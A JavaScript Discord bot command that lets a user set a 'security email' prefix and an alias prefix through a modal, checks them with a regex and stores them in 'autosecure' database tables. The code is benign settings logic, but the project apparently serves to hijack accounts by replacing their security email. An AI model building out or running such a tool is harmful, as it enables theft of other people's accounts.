const { queryParams } = require("../../../db/database");
const { EmbedBuilder, TextInputBuilder, TextInputStyle, ModalBuilder, ActionRowBuilder } = require("discord.js");
const listConfiguration = require("../../../autosecure/utils/settings/listConfiguration");

module.exports = {
    name: "emailprefix",
    editsettings: true,
    callback: async (client, interaction) => {
        const isconfig = interaction.customId?.includes("|config");
        
        if (interaction.isModalSubmit()) {
            const secEmailPrefix = interaction.fields.getTextInputValue("secEmailPrefix")?.trim() || "";
            const aliasPrefix = interaction.fields.getTextInputValue("aliasPrefix")?.trim() || "";
            
            // Validate prefixes (alphanumeric, max 20 chars, no special chars except underscore)
            const prefixRegex = /^[a-zA-Z0-9_]{0,20}$/;
            
            if (secEmailPrefix && !prefixRegex.test(secEmailPrefix)) {
                return interaction.reply({
                    content: "❌ Invalid security email prefix! Only alphanumeric characters and underscores allowed (max 20 chars).",
                    ephemeral: true
                });
            }
            
            if (aliasPrefix && !prefixRegex.test(aliasPrefix)) {
                return interaction.reply({
                    content: "❌ Invalid alias prefix! Only alphanumeric characters and underscores allowed (max 20 chars).",
                    ephemeral: true
                });
            }
            
            try {
                if (isconfig) {
                    await queryParams(
                        `UPDATE secureconfig SET prefix = ?, aliasPrefix = ? WHERE user_id = ?`,
                        [secEmailPrefix || "old", aliasPrefix || "", interaction.user.id]
                    );
                } else {
                    await queryParams(
                        `UPDATE autosecure SET prefix = ?, aliasPrefix = ? WHERE user_id = ?`,
                        [secEmailPrefix || "old", aliasPrefix || "", interaction.user.id]
                    );
                }
                
                const newMessage = await listConfiguration(interaction.user.id);
                
                newMessage.content = "✅ Email prefixes updated successfully!";
                return interaction.update(newMessage);
            } catch (error) {
                console.error("Error updating email prefixes:", error);
                return interaction.reply({
                    content: "❌ Failed to update email prefixes. Please try again.",
                    ephemeral: true
                });
            }
        } else {
            // Show modal
            const settings = isconfig
                ? await queryParams(`SELECT prefix, aliasPrefix FROM secureconfig WHERE user_id = ?`, [interaction.user.id])
                : await queryParams(`SELECT prefix, aliasPrefix FROM autosecure WHERE user_id = ?`, [interaction.user.id]);
            
            const currentSecPrefix = settings[0]?.prefix || "old";
            const currentAliasPrefix = settings[0]?.aliasPrefix || "";
            
            const modal = new ModalBuilder()
                .setCustomId(`emailprefix|${isconfig ? 'config' : 'bot'}`)
                .setTitle('Configure Email Prefixes');
            
            const secEmailInput = new TextInputBuilder()
                .setCustomId('secEmailPrefix')
                .setLabel('Security Email Prefix')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('e.g., old, secure, custom')
                .setValue(currentSecPrefix)
                .setRequired(false)
                .setMaxLength(20);
            
            const aliasInput = new TextInputBuilder()
                .setCustomId('aliasPrefix')
                .setLabel('Alias Prefix (optional)')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Leave empty to use no prefix')
                .setValue(currentAliasPrefix)
                .setRequired(false)
                .setMaxLength(20);
            
            const row1 = new ActionRowBuilder().addComponents(secEmailInput);
            const row2 = new ActionRowBuilder().addComponents(aliasInput);
            
            modal.addComponents(row1, row2);
            
            return interaction.showModal(modal);
        }
    }
};

